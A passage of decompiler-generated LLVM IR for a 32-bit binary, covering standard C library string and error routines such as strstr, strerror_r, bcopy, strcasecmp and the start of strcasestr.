  %v1_1000a1e0 = add i32 %v0_1000a148, 2
  %v2_1000a1e0 = inttoptr i32 %v1_1000a1e0 to i8*
  %v3_1000a1e0 = load i8, i8* %v2_1000a1e0, align 1
  %v3_1000a1e8 = icmp eq i8 %v3_1000a1e0, 0
  br i1 %v3_1000a1e8, label %dec_label_pc_1000a20c, label %dec_label_pc_1000a1f0

dec_label_pc_1000a1f0:                            ; preds = %dec_label_pc_1000a1e0
  %v1_1000a1f0 = add i32 %v0_1000a148, 3
  %v2_1000a1f0 = inttoptr i32 %v1_1000a1f0 to i8*
  %v3_1000a1f0 = load i8, i8* %v2_1000a1f0, align 1
  %v3_1000a1f8 = icmp eq i8 %v3_1000a1f0, 0
  br i1 %v3_1000a1f8, label %dec_label_pc_1000a20c, label %dec_label_pc_1000a200

dec_label_pc_1000a200:                            ; preds = %dec_label_pc_1000a1f0, %dec_label_pc_1000a1a8
  %v2_1000a204 = icmp ult i32 %v1_1000a1ac, %v0_1000a210
  br i1 %v2_1000a204, label %dec_label_pc_1000a1a8, label %dec_label_pc_1000a20c

dec_label_pc_1000a20c:                            ; preds = %dec_label_pc_1000a200, %dec_label_pc_1000a1d4, %dec_label_pc_1000a1e0, %dec_label_pc_1000a1f0, %dec_label_pc_1000a198, %dec_label_pc_1000a148
  %v0_1000a218 = phi i32 [ %v0_1000a148, %dec_label_pc_1000a148 ], [ %v0_1000a19c, %dec_label_pc_1000a198 ], [ %v1_1000a1f0, %dec_label_pc_1000a1f0 ], [ %v1_1000a1e0, %dec_label_pc_1000a1e0 ], [ %v1_1000a1c0, %dec_label_pc_1000a1d4 ], [ %v0_1000a210, %dec_label_pc_1000a200 ]
  %v3_1000a20c = icmp ugt i32 %v0_1000a210, %v0_1000a218
  %v0_1000a218.v0_1000a210 = select i1 %v3_1000a20c, i32 %v0_1000a218, i32 %v0_1000a210
  %v2_1000a21c = sub i32 %v0_1000a218.v0_1000a210, %tmp
  ret i32 %v2_1000a21c

; uselistorder directives
  uselistorder i32 %v1_1000a1ac, { 1, 0 }
  uselistorder i32 %v0_1000a148, { 0, 1, 2, 4, 3, 7, 6, 5 }
  uselistorder i32 %v0_1000a19c, { 1, 0, 2 }
  uselistorder i32 %v1_1000a18c, { 1, 0, 2 }
  uselistorder i32 %v0_1000a180, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000a210, { 1, 4, 0, 3, 5, 2, 6 }
  uselistorder i32 %v1_1000a150, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 1, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000a20c, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_1000a1a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a168, { 1, 0 }
  uselistorder label %dec_label_pc_1000a160, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v3_1000a224 = load i8, i8* %arg2, align 1
  %v4_1000a224 = zext i8 %v3_1000a224 to i32
  store i32 %v4_1000a224, i32* %r6.global-to-local, align 4
  %v3_1000a228 = icmp eq i8 %v3_1000a224, 0
  %v0_1000a22c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a228, i32 %v0_1000a22c)
  %v1_1000a230 = add i32 %arg1, -1
  store i32 %v1_1000a230, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a234

dec_label_pc_1000a234:                            ; preds = %dec_label_pc_1000a244, %entry
  %v0_1000a234 = phi i32 [ %v1_1000a234, %dec_label_pc_1000a244 ], [ %v1_1000a230, %entry ]
  %v1_1000a234 = add i32 %v0_1000a234, 1
  %v2_1000a234 = inttoptr i32 %v1_1000a234 to i8*
  %v3_1000a234 = load i8, i8* %v2_1000a234, align 1
  store i32 %v1_1000a234, i32* %r3.global-to-local, align 4
  %v3_1000a238 = icmp eq i8 %v3_1000a234, 0
  br i1 %v3_1000a238, label %dec_label_pc_1000a310, label %dec_label_pc_1000a244

dec_label_pc_1000a244:                            ; preds = %dec_label_pc_1000a234
  %v4_1000a23c = icmp eq i8 %v3_1000a234, %v3_1000a224
  br i1 %v4_1000a23c, label %dec_label_pc_1000a248, label %dec_label_pc_1000a234

dec_label_pc_1000a248:                            ; preds = %dec_label_pc_1000a244
  %v2_1000a248 = add i32 %tmp, 1
  %v3_1000a248 = inttoptr i32 %v2_1000a248 to i8*
  %v4_1000a248 = load i8, i8* %v3_1000a248, align 1
  %v5_1000a248 = zext i8 %v4_1000a248 to i32
  store i32 %v5_1000a248, i32* %r5.global-to-local, align 4
  store i32 %v2_1000a248, i32* %r4.global-to-local, align 4
  %v3_1000a250 = icmp eq i8 %v4_1000a248, 0
  %v0_1000a254 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a250, i32 %v0_1000a254)
  %v0_1000a258.sink.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a29c

dec_label_pc_1000a264:                            ; preds = %dec_label_pc_1000a304
  %v3_1000a264 = load i8, i8* %storemerge4.in.in, align 1
  %v4_1000a264 = zext i8 %v3_1000a264 to i32
  store i32 %v1_1000a258, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a28c.preheader

dec_label_pc_1000a28c.preheader:                  ; preds = %dec_label_pc_1000a264, %dec_label_pc_1000a29c
  %v0_1000a28c17 = phi i32 [ %v4_1000a264, %dec_label_pc_1000a264 ], [ %storemerge4, %dec_label_pc_1000a29c ]
  %v1_1000a28c.pre = load i32, i32* %r6.global-to-local, align 4
  %v4_1000a28c25 = icmp eq i32 %v0_1000a28c17, %v1_1000a28c.pre
  %v3_1000a29027 = icmp eq i32 %v0_1000a28c17, 0
  br i1 %v4_1000a28c25, label %dec_label_pc_1000a29c, label %dec_label_pc_1000a270

dec_label_pc_1000a270:                            ; preds = %dec_label_pc_1000a28c.preheader, %dec_label_pc_1000a288
  %v3_1000a29029 = phi i1 [ %v3_1000a290, %dec_label_pc_1000a288 ], [ %v3_1000a29027, %dec_label_pc_1000a28c.preheader ]
  %v0_1000a27428 = phi i32 [ %v1_1000a288, %dec_label_pc_1000a288 ], [ %v1_1000a258, %dec_label_pc_1000a28c.preheader ]
  br i1 %v3_1000a29029, label %dec_label_pc_1000a310, label %dec_label_pc_1000a274

dec_label_pc_1000a274:                            ; preds = %dec_label_pc_1000a270
  %v1_1000a274 = add i32 %v0_1000a27428, 1
  %v2_1000a274 = inttoptr i32 %v1_1000a274 to i8*
  %v3_1000a274 = load i8, i8* %v2_1000a274, align 1
  %v4_1000a274 = zext i8 %v3_1000a274 to i32
  store i32 %v1_1000a274, i32* %r11.global-to-local, align 4
  %v4_1000a278 = icmp eq i32 %v4_1000a274, %v1_1000a28c.pre
  br i1 %v4_1000a278, label %dec_label_pc_1000a29c, label %dec_label_pc_1000a284

dec_label_pc_1000a284:                            ; preds = %dec_label_pc_1000a274
  %v3_1000a27c = icmp eq i8 %v3_1000a274, 0
  br i1 %v3_1000a27c, label %dec_label_pc_1000a310, label %dec_label_pc_1000a288

dec_label_pc_1000a288:                            ; preds = %dec_label_pc_1000a284
  %v1_1000a288 = add i32 %v0_1000a27428, 2
  %v2_1000a288 = inttoptr i32 %v1_1000a288 to i8*
  %v3_1000a288 = load i8, i8* %v2_1000a288, align 1
  %v4_1000a288 = zext i8 %v3_1000a288 to i32
  store i32 %v1_1000a288, i32* %r11.global-to-local, align 4
  %v4_1000a28c = icmp eq i32 %v4_1000a288, %v1_1000a28c.pre
  %v3_1000a290 = icmp eq i8 %v3_1000a288, 0
  br i1 %v4_1000a28c, label %dec_label_pc_1000a29c, label %dec_label_pc_1000a270

dec_label_pc_1000a29c:                            ; preds = %dec_label_pc_1000a28c.preheader, %dec_label_pc_1000a288, %dec_label_pc_1000a274, %dec_label_pc_1000a248
  %v0_1000a258.sink = phi i32 [ %v0_1000a258.sink.pre, %dec_label_pc_1000a248 ], [ %v1_1000a258, %dec_label_pc_1000a28c.preheader ], [ %v1_1000a288, %dec_label_pc_1000a288 ], [ %v1_1000a274, %dec_label_pc_1000a274 ]
  %v1_1000a258 = add i32 %v0_1000a258.sink, 1
  %storemerge4.in.in = inttoptr i32 %v1_1000a258 to i8*
  %storemerge4.in = load i8, i8* %storemerge4.in.in, align 1
  %storemerge4 = zext i8 %storemerge4.in to i32
  store i32 %v1_1000a258, i32* %r11.global-to-local, align 4
  %v1_1000a29c = load i32, i32* %r5.global-to-local, align 4
  %v4_1000a29c = icmp eq i32 %storemerge4, %v1_1000a29c
  br i1 %v4_1000a29c, label %dec_label_pc_1000a2a4, label %dec_label_pc_1000a28c.preheader

dec_label_pc_1000a2a4:                            ; preds = %dec_label_pc_1000a29c
  %v1_1000a2a4 = add i32 %v0_1000a258.sink, 2
  %v2_1000a2a4 = inttoptr i32 %v1_1000a2a4 to i8*
  %v3_1000a2a4 = load i8, i8* %v2_1000a2a4, align 1
  %v4_1000a2a4 = zext i8 %v3_1000a2a4 to i32
  store i32 %v4_1000a2a4, i32* %r10.global-to-local, align 4
  store i32 %v0_1000a258.sink, i32* %r3.global-to-local, align 4
  %v0_1000a2ac = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a2ac = add i32 %v0_1000a2ac, 1
  %v2_1000a2ac = inttoptr i32 %v1_1000a2ac to i8*
  %v3_1000a2ac = load i8, i8* %v2_1000a2ac, align 1
  %v4_1000a2ac = zext i8 %v3_1000a2ac to i32
  store i32 %v1_1000a2ac, i32* %r8.global-to-local, align 4
  store i32 %v1_1000a2a4, i32* %r11.global-to-local, align 4
  %v4_1000a2b8 = icmp eq i8 %v3_1000a2a4, %v3_1000a2ac
  br i1 %v4_1000a2b8, label %dec_label_pc_1000a2c0, label %dec_label_pc_1000a304

dec_label_pc_1000a2c0:                            ; preds = %dec_label_pc_1000a2a4, %dec_label_pc_1000a2ec.dec_label_pc_1000a2c0_crit_edge
  %v0_1000a2c8 = phi i32 [ %v0_1000a2c8.pre, %dec_label_pc_1000a2ec.dec_label_pc_1000a2c0_crit_edge ], [ %v1_1000a2ac, %dec_label_pc_1000a2a4 ]
  %v0_1000a2c4 = phi i32 [ %v0_1000a2c4.pre, %dec_label_pc_1000a2ec.dec_label_pc_1000a2c0_crit_edge ], [ %v1_1000a2a4, %dec_label_pc_1000a2a4 ]
  %v0_1000a2c0 = phi i32 [ %v4_1000a2f0, %dec_label_pc_1000a2ec.dec_label_pc_1000a2c0_crit_edge ], [ %v4_1000a2a4, %dec_label_pc_1000a2a4 ]
  %v3_1000a2c0 = icmp eq i32 %v0_1000a2c0, 0
  %v1_1000a2c4 = add i32 %v0_1000a2c4, 1
  store i32 %v1_1000a2c4, i32* %r7.global-to-local, align 4
  %v1_1000a2c8 = add i32 %v0_1000a2c8, 1
  store i32 %v1_1000a2c8, i32* %r10.global-to-local, align 4
  %v0_1000a2cc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a2c0, i32 %v0_1000a2cc)
  %v0_1000a2d0 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a2d0 = add i32 %v0_1000a2d0, 1
  %v2_1000a2d0 = inttoptr i32 %v1_1000a2d0 to i8*
  %v3_1000a2d0 = load i8, i8* %v2_1000a2d0, align 1
  %v4_1000a2d0 = zext i8 %v3_1000a2d0 to i32
  %v0_1000a2d4 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a2d4 = add i32 %v0_1000a2d4, 1
  store i32 %v1_1000a2d4, i32* %r8.global-to-local, align 4
  %v0_1000a2d8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a2d8 = add i32 %v0_1000a2d8, 1
  %v2_1000a2d8 = inttoptr i32 %v1_1000a2d8 to i8*
  %v3_1000a2d8 = load i8, i8* %v2_1000a2d8, align 1
  %v0_1000a2dc = load i32, i32* %r7.global-to-local, align 4
  %v1_1000a2dc = add i32 %v0_1000a2dc, 1
  store i32 %v1_1000a2dc, i32* %r11.global-to-local, align 4
  %v4_1000a2e4 = icmp eq i8 %v3_1000a2d8, %v3_1000a2d0
  br i1 %v4_1000a2e4, label %dec_label_pc_1000a2ec, label %dec_label_pc_1000a304

dec_label_pc_1000a2ec:                            ; preds = %dec_label_pc_1000a2c0
  %v3_1000a2e0 = icmp eq i8 %v3_1000a2d0, 0
  %v0_1000a2ec = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a2e0, i32 %v0_1000a2ec)
  %v0_1000a2f0 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a2f0 = add i32 %v0_1000a2f0, 1
  %v2_1000a2f0 = inttoptr i32 %v1_1000a2f0 to i8*
  %v3_1000a2f0 = load i8, i8* %v2_1000a2f0, align 1
  %v4_1000a2f0 = zext i8 %v3_1000a2f0 to i32
  %v0_1000a2f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000a2f4 = add i32 %v0_1000a2f4, 1
  %v2_1000a2f4 = inttoptr i32 %v1_1000a2f4 to i8*
  %v3_1000a2f4 = load i8, i8* %v2_1000a2f4, align 1
  store i32 %v4_1000a2f0, i32* %r10.global-to-local, align 4
  %v4_1000a2fc = icmp eq i8 %v3_1000a2f4, %v3_1000a2f0
  br i1 %v4_1000a2fc, label %dec_label_pc_1000a2ec.dec_label_pc_1000a2c0_crit_edge, label %dec_label_pc_1000a304

dec_label_pc_1000a2ec.dec_label_pc_1000a2c0_crit_edge: ; preds = %dec_label_pc_1000a2ec
  %v0_1000a2c4.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000a2c8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a2c0

dec_label_pc_1000a304:                            ; preds = %dec_label_pc_1000a2ec, %dec_label_pc_1000a2c0, %dec_label_pc_1000a2a4
  %v0_1000a304 = phi i32 [ %v4_1000a2ac, %dec_label_pc_1000a2a4 ], [ %v4_1000a2f0, %dec_label_pc_1000a2ec ], [ %v4_1000a2d0, %dec_label_pc_1000a2c0 ]
  %v3_1000a304 = icmp eq i32 %v0_1000a304, 0
  br i1 %v3_1000a304, label %dec_label_pc_1000a30c, label %dec_label_pc_1000a264

dec_label_pc_1000a30c:                            ; preds = %dec_label_pc_1000a304
  ret i32 %v0_1000a258.sink

dec_label_pc_1000a310:                            ; preds = %dec_label_pc_1000a234, %dec_label_pc_1000a284, %dec_label_pc_1000a270
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1000a2f0, { 0, 2, 1 }
  uselistorder i8 %v3_1000a2d0, { 1, 0, 2 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i8* %storemerge4.in.in, { 1, 0 }
  uselistorder i32 %v1_1000a258, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1000a258.sink, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000a288, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000a27428, { 1, 0 }
  uselistorder i32 %v1_1000a28c.pre, { 1, 2, 0 }
  uselistorder i32 %v1_1000a234, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 0 }
  uselistorder label %dec_label_pc_1000a310, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a2c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a29c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000a270, { 1, 0 }
  uselistorder label %dec_label_pc_1000a28c.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  store i32 268477232, i32* @lr, align 4
  %v0_1000a32c = call i32 @__xpg_strerror_r()
  %v0_1000a334 = load i32, i32* @r29, align 4
  ret i32 %v0_1000a334
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-39 = alloca i32, align 4
  %v0_1000a348 = load i32, i32* @r3, align 4
  %v2_1000a348 = icmp ugt i32 %v0_1000a348, 124
  %v0_1000a358 = load i32, i32* @r4, align 4
  store i32 %v0_1000a358, i32* %r27.global-to-local, align 4
  %v0_1000a360 = load i32, i32* @r5, align 4
  br i1 %v2_1000a348, label %dec_label_pc_1000a3a4, label %dec_label_pc_1000a368

dec_label_pc_1000a368:                            ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_100129d8.596 to i32), i32* %r30.global-to-local, align 4
  %v3_1000a3847 = icmp eq i32 %v0_1000a348, 0
  br i1 %v3_1000a3847, label %dec_label_pc_1000a398, label %dec_label_pc_1000a378

dec_label_pc_1000a378:                            ; preds = %dec_label_pc_1000a368, %dec_label_pc_1000a378
  %v0_1000a37c = phi i32 [ %v1_1000a37c, %dec_label_pc_1000a378 ], [ ptrtoint ([8 x i8]* @global_var_100129d8.596 to i32), %dec_label_pc_1000a368 ]
  %v1_1000a37c = add i32 %v0_1000a37c, 1
  store i32 %v1_1000a37c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000a378

dec_label_pc_1000a398:                            ; preds = %dec_label_pc_1000a368
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000a3d8

dec_label_pc_1000a3a4:                            ; preds = %entry
  %tmp = icmp slt i32 %v0_1000a348, 0
  %v1_1000a3a8 = zext i1 %tmp to i32
  %v2_1000a3a8 = ashr i32 %v0_1000a348, 31
  %v3_1000a3a8 = and i32 %v2_1000a3a8, -2
  %v4_1000a3a8 = or i32 %v3_1000a3a8, %v1_1000a3a8
  store i32 22, i32* %r28.global-to-local, align 4
  %v5_1000a3bc = bitcast i32* %stack_var_-39 to i8*
  %v6_1000a3bc = call i32 @_uintmaxtostr(i8* %v5_1000a3bc, i32 %v4_1000a3a8, i32 %v0_1000a348, i32 -10, i32 0)
  %v1_1000a3c4 = add i32 %v6_1000a3bc, -14
  store i32 %v1_1000a3c4, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_100129c8.597 to i32), i32* @r4, align 4
  store i32 %v1_1000a3c4, i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 268477400, i32* @lr, align 4
  %v0_1000a3d4 = call i32 @memcpy()
  %v0_1000a3d8.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_1000a3dc.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_1000a3ec.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000a3d8

dec_label_pc_1000a3d8:                            ; preds = %dec_label_pc_1000a398, %dec_label_pc_1000a3a4
  %v0_1000a3ec = phi i32 [ %v0_1000a360, %dec_label_pc_1000a398 ], [ %v0_1000a3ec.pre, %dec_label_pc_1000a3a4 ]
  %v0_1000a3dc = phi i32 [ ptrtoint ([8 x i8]* @global_var_100129d8.596 to i32), %dec_label_pc_1000a398 ], [ %v0_1000a3dc.pre, %dec_label_pc_1000a3a4 ]
  %v1_1000a3e0 = phi i32 [ %v0_1000a358, %dec_label_pc_1000a398 ], [ %v0_1000a3d8.pre, %dec_label_pc_1000a3a4 ]
  %tmp19 = icmp slt i32 %v1_1000a3e0, 0
  %v1_1000a3d8 = zext i1 %tmp19 to i32
  %v2_1000a3d8 = ashr i32 %v1_1000a3e0, 31
  %v3_1000a3d8 = and i32 %v2_1000a3d8, -2
  %v4_1000a3d8 = or i32 %v3_1000a3d8, %v1_1000a3d8
  store i32 %v0_1000a3dc, i32* @r3, align 4
  %v2_1000a3e0 = xor i32 %v4_1000a3d8, %v1_1000a3e0
  %v2_1000a3e4 = sub i32 %v4_1000a3d8, %v2_1000a3e0
  %tmp20 = icmp slt i32 %v2_1000a3e4, 0
  %v1_1000a3e8 = zext i1 %tmp20 to i32
  %v2_1000a3e8 = ashr i32 %v2_1000a3e4, 31
  %v3_1000a3e8 = and i32 %v2_1000a3e8, -2
  %v4_1000a3e8 = or i32 %v3_1000a3e8, %v1_1000a3e8
  %v2_1000a3ec = and i32 %v4_1000a3e8, %v0_1000a3ec
  store i32 %v2_1000a3ec, i32* @r29, align 4
  %v0_1000a3f0 = call i32 @__GI_strlen()
  %v1_1000a3f4 = add i32 %v0_1000a3f0, 1
  store i32 %v1_1000a3f4, i32* %r31.global-to-local, align 4
  %v1_1000a3f8 = load i32, i32* @r29, align 4
  %v3_1000a3f8 = icmp ugt i32 %v1_1000a3f4, %v1_1000a3f8
  br i1 %v3_1000a3f8, label %dec_label_pc_1000a400, label %dec_label_pc_1000a408

dec_label_pc_1000a400:                            ; preds = %dec_label_pc_1000a3d8
  store i32 %v1_1000a3f8, i32* %r31.global-to-local, align 4
  store i32 34, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000a408

dec_label_pc_1000a408:                            ; preds = %dec_label_pc_1000a3d8, %dec_label_pc_1000a400
  %v0_1000a418 = phi i32 [ %v1_1000a3f8, %dec_label_pc_1000a400 ], [ %v1_1000a3f4, %dec_label_pc_1000a3d8 ]
  %v3_1000a408 = icmp eq i32 %v0_1000a418, 0
  br i1 %v3_1000a408, label %dec_label_pc_1000a42c, label %dec_label_pc_1000a410

dec_label_pc_1000a410:                            ; preds = %dec_label_pc_1000a408
  %v0_1000a410 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000a410, i32* @r4, align 4
  %v0_1000a414 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1000a414, i32* @r3, align 4
  store i32 %v0_1000a418, i32* @r5, align 4
  store i32 268477472, i32* @lr, align 4
  %v0_1000a41c = call i32 @memcpy()
  %v1_1000a420 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a420 = add i32 %v1_1000a420, %v0_1000a414
  %v3_1000a428 = add i32 %v2_1000a420, -1
  %v4_1000a428 = inttoptr i32 %v3_1000a428 to i8*
  store i8 0, i8* %v4_1000a428, align 1
  br label %dec_label_pc_1000a42c

dec_label_pc_1000a42c:                            ; preds = %dec_label_pc_1000a408, %dec_label_pc_1000a410
  %v0_1000a42c = load i32, i32* %r28.global-to-local, align 4
  %v3_1000a42c = icmp eq i32 %v0_1000a42c, 0
  br i1 %v3_1000a42c, label %dec_label_pc_1000a43c, label %dec_label_pc_1000a434

dec_label_pc_1000a434:                            ; preds = %dec_label_pc_1000a42c
  %v0_1000a434 = call i32 @__errno_location()
  %v0_1000a438 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000a438 = inttoptr i32 %v0_1000a434 to i32*
  store i32 %v0_1000a438, i32* %v2_1000a438, align 4
  %v0_1000a440.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000a43c

dec_label_pc_1000a43c:                            ; preds = %dec_label_pc_1000a42c, %dec_label_pc_1000a434
  %v0_1000a440 = phi i32 [ 0, %dec_label_pc_1000a42c ], [ %v0_1000a440.pre, %dec_label_pc_1000a434 ]
  ret i32 %v0_1000a440

; uselistorder directives
  uselistorder i32 %v2_1000a3e4, { 1, 0 }
  uselistorder i32 %v4_1000a3d8, { 1, 0 }
  uselistorder i32 %v1_1000a3e0, { 1, 2, 0 }
  uselistorder i32 %v1_1000a37c, { 1, 0 }
  uselistorder i32 %v0_1000a348, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r30.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r28.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_100129d8.596 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a43c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a42c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a408, { 1, 0 }
  uselistorder label %dec_label_pc_1000a3d8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a378, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1000a460 = call i32 @memmove(i32 %arg2, i32 %arg1)
  ret i32 %v2_1000a460
}

define i32 @__GI_strcasecmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_1000a468 = load i32, i32* bitcast (i32** @global_var_10024a24.599 to i32*), align 4
  %v0_1000a470.pre = load i32, i32* @r3, align 4
  %v1_1000a470.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000a470

dec_label_pc_1000a470:                            ; preds = %dec_label_pc_1000a498, %entry
  %v0_1000a4ac6 = phi i32 [ %v0_1000a4ac7, %dec_label_pc_1000a498 ], [ 0, %entry ]
  %v0_1000a49c = phi i32 [ %v1_1000a49c, %dec_label_pc_1000a498 ], [ %v1_1000a470.pre, %entry ]
  %v0_1000a4a0 = phi i32 [ %v1_1000a4a0, %dec_label_pc_1000a498 ], [ %v0_1000a470.pre, %entry ]
  %v4_1000a470 = icmp eq i32 %v0_1000a4a0, %v0_1000a49c
  %.pre = inttoptr i32 %v0_1000a4a0 to i8*
  br i1 %v4_1000a470, label %dec_label_pc_1000a498, label %dec_label_pc_1000a478

dec_label_pc_1000a478:                            ; preds = %dec_label_pc_1000a470
  %v2_1000a478 = load i8, i8* %.pre, align 1
  %v3_1000a478 = zext i8 %v2_1000a478 to i32
  %v1_1000a47c = inttoptr i32 %v0_1000a49c to i8*
  %v2_1000a47c = load i8, i8* %v1_1000a47c, align 1
  %v3_1000a47c = zext i8 %v2_1000a47c to i32
  %v1_1000a480 = mul nuw nsw i32 %v3_1000a478, 2
  %v1_1000a484 = mul nuw nsw i32 %v3_1000a47c, 2
  %v2_1000a488 = add i32 %v1_1000a480, %v3_1000a468
  %v3_1000a488 = inttoptr i32 %v2_1000a488 to i16*
  %v4_1000a488 = load i16, i16* %v3_1000a488, align 2
  %v5_1000a488 = sext i16 %v4_1000a488 to i32
  %v2_1000a48c = add i32 %v1_1000a484, %v3_1000a468
  %v3_1000a48c = inttoptr i32 %v2_1000a48c to i16*
  %v4_1000a48c = load i16, i16* %v3_1000a48c, align 2
  %v5_1000a48c = sext i16 %v4_1000a48c to i32
  %v2_1000a490 = sub nsw i32 %v5_1000a488, %v5_1000a48c
  %v4_1000a494 = icmp eq i16 %v4_1000a488, %v4_1000a48c
  br i1 %v4_1000a494, label %dec_label_pc_1000a498, label %dec_label_pc_1000a4ac

dec_label_pc_1000a498:                            ; preds = %dec_label_pc_1000a470, %dec_label_pc_1000a478
  %v0_1000a4ac7 = phi i32 [ %v2_1000a490, %dec_label_pc_1000a478 ], [ %v0_1000a4ac6, %dec_label_pc_1000a470 ]
  %v2_1000a498 = load i8, i8* %.pre, align 1
  %v1_1000a49c = add i32 %v0_1000a49c, 1
  %v1_1000a4a0 = add i32 %v0_1000a4a0, 1
  %v3_1000a4a4 = icmp eq i8 %v2_1000a498, 0
  br i1 %v3_1000a4a4, label %dec_label_pc_1000a4ac, label %dec_label_pc_1000a470

dec_label_pc_1000a4ac:                            ; preds = %dec_label_pc_1000a498, %dec_label_pc_1000a478
  %v0_1000a4ac = phi i32 [ %v0_1000a4ac7, %dec_label_pc_1000a498 ], [ %v2_1000a490, %dec_label_pc_1000a478 ]
  ret i32 %v0_1000a4ac

; uselistorder directives
  uselistorder i32 %v2_1000a490, { 1, 0 }
  uselistorder i32 %v0_1000a4a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a498, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v3_1000a4bc = load i32, i32* bitcast (i32** @global_var_10024a24.599 to i32*), align 4
  store i32 %v3_1000a4bc, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a4c4

dec_label_pc_1000a4c4:                            ; preds = %dec_label_pc_1000a4c4.backedge, %entry
  %v0_1000a4c4 = phi i32 [ %v0_1000a4c4.pre, %dec_label_pc_1000a4c4.backedge ], [ %arg2, %entry ]
  %v1_1000a4c4 = inttoptr i32 %v0_1000a4c4 to i8*
  %v2_1000a4c4 = load i8, i8* %v1_1000a4c4, align 1
  %v3_1000a4c4 = zext i8 %v2_1000a4c4 to i32
  store i32 %v3_1000a4c4, i32* %r0.global-to-local, align 4
  %v1_1000a4c8 = add i32 %v0_1000a4c4, 1
  store i32 %v1_1000a4c8, i32* %r10.global-to-local, align 4
  %v3_1000a4cc = icmp eq i8 %v2_1000a4c4, 0
